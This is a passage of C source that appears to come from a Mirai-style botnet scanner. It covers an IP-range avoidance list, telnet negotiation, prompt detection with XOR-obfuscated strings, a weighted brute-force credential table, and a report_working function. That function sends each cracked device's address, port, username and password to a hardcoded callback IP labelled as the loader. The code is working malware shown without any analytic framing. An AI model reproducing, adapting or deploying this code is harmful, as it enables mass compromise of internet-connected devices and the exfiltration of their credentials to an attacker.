          (o1 == 216 && o2 == 237 && o3 >= 128 && o3 < 159) || //Choopa & Vultr
          (o1 == 108 && o2 == 61) ||                           //Choopa & Vultr
          (o1 == 45 && o2 == 76) ||                            //Choopa & Vultr
          (o1 == 185 && o2 == 11 && o3 >= 144 && o3 < 148) ||  //Blazingfast & Nforce
          (o1 == 185 && o2 == 56 && o3 >= 21 && o3 < 23) ||    //Blazingfast & Nforce
          (o1 == 185 && o2 == 61 && o3 >= 136 && o3 < 139) ||  //Blazingfast & Nforce
          (o1 == 185 && o2 == 62 && o3 >= 187 && o3 < 191) ||  //Blazingfast & Nforce
          (o1 == 66 && o2 == 150 && o3 >= 120 && o3 < 215) ||  //Blazingfast & Nforce
          (o1 == 66 && o2 == 151 && o3 >= 137 && o3 < 139) ||  //Blazingfast & Nforce
          (o1 == 64 && o2 == 94 && o3 >= 237 && o3 < 255) ||   //Blazingfast & Nforce
          (o1 == 63 && o2 == 251 && o3 >= 19 && o3 < 21) ||    //Blazingfast & Nforce
          (o1 == 70 && o2 == 42 && o3 >= 73 && o3 < 75) ||     //Blazingfast & Nforce
          (o1 == 74 && o2 == 91 && o3 >= 113 && o3 < 115) ||   //Blazingfast & Nforce
          (o1 == 74 && o2 == 201 && o3 >= 56 && o3 < 58) ||    //Blazingfast & Nforce
          (o1 == 188 && o2 == 209 && o3 >= 48 && o3 < 53) ||   //Blazingfast & Nforce
          (o1 == 188 && o2 == 165) ||                          //OVH
          (o1 == 149 && o2 == 202) ||                          //OVH
          (o1 == 151 && o2 == 80) ||                           //OVH
          (o1 == 164 && o2 == 132) ||                          //OVH
          (o1 == 176 && o2 == 31) ||                           //OVH
          (o1 == 167 && o2 == 114) ||                          //OVH
          (o1 == 178 && o2 == 32) ||                           //OVH
          (o1 == 178 && o2 == 33) ||                           //OVH
          (o1 == 37 && o2 == 59) ||                            //OVH
          (o1 == 37 && o2 == 187) ||                           //OVH
          (o1 == 46 && o2 == 105) ||                           //OVH
          (o1 == 51 && o2 == 254) ||                           //OVH
          (o1 == 51 && o2 == 255) ||                           //OVH
          (o1 == 5 && o2 == 135) ||                            //OVH
          (o1 == 5 && o2 == 196) ||                            //OVH
          (o1 == 5 && o2 == 39) ||                             //OVH
          (o1 == 91 && o2 == 134) ||                           //OVH
          (o1 == 104 && o2 == 200 && o3 >= 128 && o3 < 159) || //Total Server Solutions
          (o1 == 107 && o2 == 152 && o3 >= 96 && o3 < 111) ||  //Total Server Solutions
          (o1 == 107 && o2 == 181 && o3 >= 160 && o3 < 189) || //Total Server Solutions
          (o1 == 172 && o2 == 98 && o3 >= 64 && o3 < 95) ||    //Total Server Solutions
          (o1 == 184 && o2 == 170 && o3 >= 240 && o3 < 255) || //Total Server Solutions
          (o1 == 192 && o2 == 111 && o3 >= 128 && o3 < 143) || //Total Server Solutions
          (o1 == 192 && o2 == 252 && o3 >= 208 && o3 < 223) || //Total Server Solutions
          (o1 == 192 && o2 == 40 && o3 >= 56 && o3 < 59) ||    //Total Server Solutions
          (o1 == 198 && o2 == 8 && o3 >= 81 && o3 < 95) ||     //Total Server Solutions
          (o1 == 199 && o2 == 116 && o3 >= 112 && o3 < 119) || //Total Server Solutions
          (o1 == 199 && o2 == 229 && o3 >= 248 && o3 < 255) || //Total Server Solutions
          (o1 == 199 && o2 == 36 && o3 >= 220 && o3 < 223) ||  //Total Server Solutions
          (o1 == 199 && o2 == 58 && o3 >= 184 && o3 < 187) ||  //Total Server Solutions
          (o1 == 206 && o2 == 220 && o3 >= 172 && o3 < 175) || //Total Server Solutions
          (o1 == 208 && o2 == 78 && o3 >= 40 && o3 < 43) ||    //Total Server Solutions
          (o1 == 208 && o2 == 93 && o3 >= 192 && o3 < 193) ||  //Total Server Solutions
          (o1 == 66 && o2 == 71 && o3 >= 240 && o3 < 255) ||   //Total Server Solutions
          (o1 == 98 && o2 == 142 && o3 >= 208 && o3 < 223) ||  //Total Server Solutions
          (o1 == 107 && o2 >= 20 && o2 < 24) ||                //Amazon
          (o1 == 35 && o2 >= 159 && o2 < 183) ||               //Amazon
          (o1 == 52 && o2 >= 1 && o2 < 95) ||                  //Amazon
          (o1 == 52 && o2 >= 95 && o2 < 255) ||                //Amazon + Microsoft
          (o1 == 54 && o2 >= 64 && o2 < 95) ||                 //Amazon + Microsoft
          (o1 == 54 && o2 >= 144 && o2 < 255) ||               //Amazon + Microsoft
          (o1 == 13 && o2 >= 52 && o2 < 60) ||                 //Amazon + Microsoft
          (o1 == 13 && o2 >= 112 && o2 < 115) ||               //Amazon + Microsoft
          (o1 == 163 && o2 == 172) ||                          //ONLINE SAS
          (o1 == 51 && o2 >= 15 && o2 < 255) ||                //ONLINE SAS
          (o1 == 79 && o2 == 121 && o3 >= 128 && o3 < 255) ||  //Some more
          (o1 == 212 && o2 == 47 && o3 >= 224 && o3 < 255) ||  //Some more
          (o1 == 89 && o2 == 34 && o3 >= 96 && o3 < 97) ||     //Some more
          (o1 == 219 && o2 >= 216 && o2 < 231) ||              //Some more
          (o1 == 23 && o2 >= 94 && o2 < 109) ||                //Some more
          (o1 == 23 && o2 == 254 && o3 == 167) ||
          (o1 == 178 && o2 >= 62 && o2 < 63) ||                //Some more
          (o1 == 106 && o2 >= 182 && o2 < 189) ||              //Some more
          (o1 == 106 && o2 >= 184) ||                          //Some more
          (o1 == 34 && o2 >= 245 && o2 < 255) ||               //Some more
          (o1 == 87 && o2 >= 97 && o2 < 99) ||                 //Some more
          (o1 == 86 && o2 == 208) ||                           //Some more
          (o1 == 86 && o2 == 209) ||                           //Some more
          (o1 == 193 && o2 == 164) ||                          //Some more
          (o1 == 120 && o2 >= 103 && o2 < 108) ||              //Ministry of Education Computer Science
          (o1 == 188 && o2 == 68) ||                           //Ministry of Education Computer Science
          (o1 == 78 && o2 == 46) ||                            //Ministry of Education Computer Science
          (o1 >= 224) ||                                       //Multicast
          (o1 == 142) ||
          (o1 == 157 && o2 == 230));

    return INET_ADDR(o1,o2,o3,o4);
}

static int consume_iacs(struct scanner_connection *conn)
{
    int consumed = 0;
    uint8_t *ptr = conn->rdbuf;

    while (consumed < conn->rdbuf_pos)
    {
        int i;

        if (*ptr != 0xff)
            break;
        else if (*ptr == 0xff)
        {
            if (!can_consume(conn, ptr, 1))
                break;
            if (ptr[1] == 0xff)
            {
                ptr += 2;
                consumed += 2;
                continue;
            }
            else if (ptr[1] == 0xfd)
            {
                uint8_t tmp1[3] = {255, 251, 31};
                uint8_t tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};

                if (!can_consume(conn, ptr, 2))
                    break;
                if (ptr[2] != 31)
                    goto iac_wont;

                ptr += 3;
                consumed += 3;

                send(conn->fd, tmp1, 3, MSG_NOSIGNAL);
                send(conn->fd, tmp2, 9, MSG_NOSIGNAL);
            }
            else
            {
                iac_wont:

                if (!can_consume(conn, ptr, 2))
                    break;

                for (i = 0; i < 3; i++)
                {
                    if (ptr[i] == 0xfd)
                        ptr[i] = 0xfc;
                    else if (ptr[i] == 0xfb)
                        ptr[i] = 0xfd;
                }

                send(conn->fd, ptr, 3, MSG_NOSIGNAL);
                ptr += 3;
                consumed += 3;
            }
        }
    }

    return consumed;
}

static int consume_any_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_user_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
    {
        int tmp, len;
        char *ogin, *enter;
        
        table_unlock_val(XOR_SCAN_OGIN);
        table_unlock_val(XOR_SCAN_ENTER);
        
        ogin = table_retrieve_val(XOR_SCAN_OGIN, &len);
        enter = table_retrieve_val(XOR_SCAN_ENTER, &len);
        
        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, ogin, len - 1) != -1))
            prompt_ending = tmp;
        
        else if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, enter, len - 1) != -1))
            prompt_ending = tmp;
        
    }
        table_lock_val(XOR_SCAN_OGIN);
        table_lock_val(XOR_SCAN_ENTER);
        
    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_pass_prompt(struct scanner_connection *conn)
{
    char *pch;
    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#')
        {
            prompt_ending = i + 1;
            break;
        }
    }

        if (prompt_ending == -1)
    {
        char *kron_pass;
        int tmp, len;
        table_unlock_val(XOR_SCAN_ASSWORD);
        kron_pass = table_retrieve_val(XOR_SCAN_ASSWORD, &len);
        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, kron_pass, len - 1) != -1))
            prompt_ending = tmp;
    }
        table_lock_val(XOR_SCAN_ASSWORD);
    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_resp_prompt(struct scanner_connection *conn)
{
    char *tkn_resp;
    int prompt_ending, len;

    table_unlock_val(XOR_SCAN_NCORRECT);
    tkn_resp = table_retrieve_val(XOR_SCAN_NCORRECT, &len);
    if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp, len - 1) != -1)
    {
        table_lock_val(XOR_SCAN_NCORRECT);
        return -1;
    }
    table_lock_val(XOR_SCAN_NCORRECT);

    table_unlock_val(XOR_SCAN_RESP);
    tkn_resp = table_retrieve_val(XOR_SCAN_RESP, &len);
    prompt_ending = util_memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp, len - 1);
    table_lock_val(XOR_SCAN_RESP);

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static void add_auth_entry(char *enc_user, char *enc_pass, uint16_t weight)
{
    int tmp;

    auth_table = realloc(auth_table, (auth_table_len + 1) * sizeof (struct scanner_auth));
    auth_table[auth_table_len].username = deobf(enc_user, &tmp);
    auth_table[auth_table_len].username_len = (uint8_t)tmp;
    auth_table[auth_table_len].password = deobf(enc_pass, &tmp);
    auth_table[auth_table_len].password_len = (uint8_t)tmp;
    auth_table[auth_table_len].weight_min = auth_table_max_weight;
    auth_table[auth_table_len++].weight_max = auth_table_max_weight + weight;
    auth_table_max_weight += weight;
}

static struct scanner_auth *random_auth_entry(void)
{
    int i;
    uint16_t r = (uint16_t)(rand_next() % auth_table_max_weight);

    for (i = 0; i < auth_table_len; i++)
    {
        if (r < auth_table[i].weight_min)
            continue;
        else if (r < auth_table[i].weight_max)
            return &auth_table[i];
    }

    return NULL;
}

static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *auth)
{
    struct sockaddr_in addr;
    int pid = fork(), fd;

    if (pid > 0 || pid == -1)
        return;

    if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        exit(0);
    }
    
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(45,95,169,105); //SCANLISTEN LOADER CALLBACK
    addr.sin_port = htons(9382);

    if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
    {
        close(fd);
        exit(0);
    }

    uint8_t zero = 0;
    send(fd, &zero, sizeof (uint8_t), MSG_NOSIGNAL);
    send(fd, &daddr, sizeof (ipv4_t), MSG_NOSIGNAL);
    send(fd, &dport, sizeof (uint16_t), MSG_NOSIGNAL);
    send(fd, &(auth->username_len), sizeof (uint8_t), MSG_NOSIGNAL);
    send(fd, auth->username, auth->username_len, MSG_NOSIGNAL);
    send(fd, &(auth->password_len), sizeof (uint8_t), MSG_NOSIGNAL);
    send(fd, auth->password, auth->password_len, MSG_NOSIGNAL);

    close(fd);
    exit(0);
}

static char *deobf(char *str, int *len)
{   
    int i;
    char *cpy;

    *len = util_strlen(str);
    cpy = malloc(*len + 1);

    util_memcpy(cpy, str, *len + 1);

    for (i = 0; i < *len; i++)
    {
        // 0xFDADCAEF
        cpy[i] ^= 0xFD; // 1
        cpy[i] ^= 0xAD; // 2
        cpy[i] ^= 0xCA; // 3
        cpy[i] ^= 0xEF; // 4
    }

    return cpy;
}

static BOOL can_consume(struct scanner_connection *conn, uint8_t *ptr, int amount)
{
    uint8_t *end = conn->rdbuf + conn->rdbuf_pos;

    return ptr + amount < end;
}
#endif
